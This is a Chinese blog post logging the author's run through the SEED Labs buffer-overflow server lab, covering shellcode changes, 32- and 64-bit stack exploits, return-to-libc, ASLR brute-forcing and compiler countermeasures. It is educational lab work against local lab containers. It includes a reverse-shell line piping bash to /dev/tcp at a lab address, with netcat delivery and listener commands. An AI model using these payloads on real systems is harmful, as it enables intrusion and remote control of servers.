---
layout: post
title:  "Buffer-Overflow Attack"
date:   2020-06-01 00:00:00 +0800
categories: 实验
tags: seedlab buffer-overflow
comments: true
mathjax: true
copyrights: 原创
---

本文为 [SEED Labs 2.0 - Buffer-Overflow Attack Lab (Server Version)](https://seedsecuritylabs.org/Labs_20.04/Software/Buffer_Overflow_Server/) 的实验记录。

## 实验原理

<img src="/assets/post/images/bufferoverflow1.png" alt="bufferoverflow1" style="zoom: 20%;" />

## Task1: Get Familiar with the Shellcode

进入 shellcode 文件夹。

> **Task.** Please modify the shellcode, so you can use it to delete a file. Please include your modified the
> shellcode in the lab report, as well as your screenshots.

根据 Task 的要求，我们对 shellcode_32.py 进行修改，使其能够删除文件。

需要注意的是，shell长度不能变。

<img src="/assets/post/images/bufferflow1.png" alt="bufferflow1" style="zoom:50%;" />

然后我们新建 tmpfile 文件并运行 shellcode，过程和结果如下

```bash
touch tmpfile
./shellcode_32.py
./shellcode_64.py
make
a32.out
a64.out
```

<img src="/assets/post/images/bufferflow2.png" alt="bufferflow2" style="zoom:50%;" />

执行完后，tmpfile 也被删除了。

## Task 2: Level-1 Attack

首先关闭 address randomization countermeasure

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

进入 server-code 文件夹下，执行命令

```bash
make
make install
```

然后返回其根目录，执行命令启动 docker

```bash
dcbuild
dcup
```

进入 attack-code 文件夹，执行

```bash
$ echo hello | nc 10.9.0.5 9090
^C
```

server 显示

<img src="/assets/post/images/bufferflow3.png" alt="bufferflow3" style="zoom:50%;" />

我们修改 exploit.py

<img src="/assets/post/images/bufferflow4.png" alt="bufferflow4" style="zoom:50%;" />

其中，

- shellcode 即为刚刚 shellcode_32.py 中的 shellcode
- $\text{ret}=\text{ebp}+n$
  - ebp 就是刚刚 `echo hello` 中得到的 ebp，因为关闭了地址随机化，所以每次都一样
  - $n$ 只要大于等于 $8$ 都可以
- $\text{offset}=$`0xffffd438`$-$`0xffffd3c8`+4

然后执行

```bash
./exploit.py
cat badfile | nc 10.9.0.5 9090
```

得到了结果

<img src="/assets/post/images/bufferflow5.png" alt="bufferflow5" style="zoom:50%;" />

> **Reverse shell.** Please modify the command string in your shellcode, so you can get a reverse shell on the target
> server. Please include screenshots and explanation in your lab report.

根据 Task 要求，我们将 shellcode 改为 reverse shell，即第 10 行改为

```shell
   "/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1           *"
```

启动新 terminal ，执行监听

```bash
nc -lnv 9090
```

在原来的 terminal 中再次执行

```bash
./exploit.py
cat badfile | nc 10.9.0.5 9090
```

可以看到获得了权限

<img src="/assets/post/images/bufferflow6.png" alt="bufferflow6" style="zoom:50%;" />

## Task 3: Level-2 Attack

本 task 重点在于处理不知道大小的 buffer。

解决方法很简单：不知道 offset，那就挨个试一遍。

同样的，我们先 `echo hello`

```bash
$ echo hello | nc 10.9.0.6 9090
^C
```

<img src="/assets/post/images/bufferflow7.png" alt="bufferflow7" style="zoom:50%;" />

修改 exploit.py

<img src="/assets/post/images/bufferflow8.png" alt="bufferflow8" style="zoom:50%;" />

其中，

- ret 应当大于等于 `0xffffd708`+308，但应当保证 shellcode 都在 payload 内
- offset 为 100-300 之间的某个值

然后执行

```bash
./exploit.py
cat badfile | nc 10.9.0.6 9090
```

得到了结果

<img src="/assets/post/images/bufferflow9.png" alt="bufferflow9" style="zoom:50%;" />

## Task 4: Level-3 Attack

本 task 重点在于处理 64 位地址的 buffer。实验手册这样描述本实验遇到的问题：

> Compared to buffer-overflow attacks on 32-bit machines, attacks on 64-bit machines is more
> difficult. The most difficult part is the address. Although the x64 architecture supports 64-bit address space,
> only the address from `0x00` through `0x00007FFFFFFFFFFF` is allowed. That means for every address (8 bytes), the highest two bytes are always zeros. This causes a problem.
> In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will
> be copied into the stack via `strcpy()`. We know that the `strcpy()` function will stop copying when it
> sees a zero. Therefore, if a zero appears in the middle of the payload, the content after the zero cannot be
> copied into the stack. How to solve this problem is the most difficult challenge in this attack.

解决方法是 ret 采用 little endian，复用地址中的 `\0x00\0x00`。

同样的，我们先 `echo hello`

```bash
$ echo hello | nc 10.9.0.7 9090
^C
```

<img src="/assets/post/images/bufferflow10.png" alt="bufferflow10" style="zoom:50%;" />

修改 exploit.py

<img src="/assets/post/images/bufferflow11.png" alt="bufferflow11" style="zoom:50%;" />

其中，

- shellcode 即为 shellcode_64.py 中的 shellcode
- start 设定为一个较小的值，可以直接取 $0$
- $\text{ret}=\text{rbp}+n$
  - ebp 就是刚刚 `echo hello` 中得到的 rbp，因为关闭了地址随机化，所以每次都一样
  - $n\in[\text{buffer},\text{buffer}+\text{start}]$
- $\text{offset}=$`0x00007fffffffe610`$-$`0x00007fffffffe540`+8

然后执行

```bash
./exploit.py
cat badfile | nc 10.9.0.7 9090
```

得到了结果

<img src="/assets/post/images/bufferflow12.png" alt="bufferflow12" style="zoom:50%;" />

## Task 5: Level-4 Attack

本 task 重点在于执行 return-to-libc 攻击。

同样的，我们先 `echo hello`

```bash
$ echo hello | nc 10.9.0.7 9090
^C
```

<img src="/assets/post/images/bufferflow13.png" alt="bufferflow13" style="zoom:50%;" />

修改 exploit.py

<img src="/assets/post/images/bufferflow14.png" alt="bufferflow14" style="zoom:50%;" />

其中，

- ret 取一个较大的值，在 $1184$ 到 $1424$ 之间
- $\text{offset}=$`0x00007fffffffe700`$-$`0x00007fffffffe6a0`+8

然后执行

```bash
./exploit.py
cat badfile | nc 10.9.0.8 9090
```

得到了结果

<img src="/assets/post/images/bufferflow15.png" alt="bufferflow15" style="zoom:50%;" />

## Task 6: Experimenting with the Address Randomization

打开地址随机化

```bash
sudo sysctl -w kernel.randomize_va_space=2
```

各执行两次如下命令

```bash
$ echo hello | nc 10.9.0.5 9090
^C
$ echo hello | nc 10.9.0.7 9090
^C
```

得到结果

<img src="/assets/post/images/bufferflow16.png" alt="bufferflow16" style="zoom:50%;" />

可以看到，每次地址都不相同，导致攻击困难。

使用 Task2 中 reverse shell 的 exploit.py 代码，执行命令

```bash
./exploit.py
./brute-force.sh
```

```bash
nc -lnv 9090
```

在尝试 $52417$ 次后，成功获得权限

<img src="/assets/post/images/bufferflow17.png" alt="bufferflow17" style="zoom:50%;" />

## Tasks 7: Experimenting with Other Countermeasures

进入 server-code 文件夹，去除 `-fno-stack-protector` 编译 stack.c，并将 badfile 作为输入

<img src="/assets/post/images/bufferflow18.png" alt="bufferflow18" style="zoom:50%;" />

可以看到检测到了 stack smashing。

进入 shellcode 文件夹，去除 `-z execstack` 编译 call_shellcode.c 并运行

<img src="/assets/post/images/bufferflow19.png" alt="bufferflow19" style="zoom:50%;" />

可以看到，栈不再可执行。

## 实验总结

实验总体难度不大，只要把握住 buffer overflow 的原理，便可以很容易解决各种问题。Task2 为本实验的基础；Task3 做了一点微小的改动；Task4 难度较大，因为 64 位地址的最高两位永远是 $00$，导致 `strcpy` 会提前终止，需要思考如何处理这一问题；Task5 理解原理后比较容易；Task6 和 Task7 依葫芦画瓢即可，没有难度。
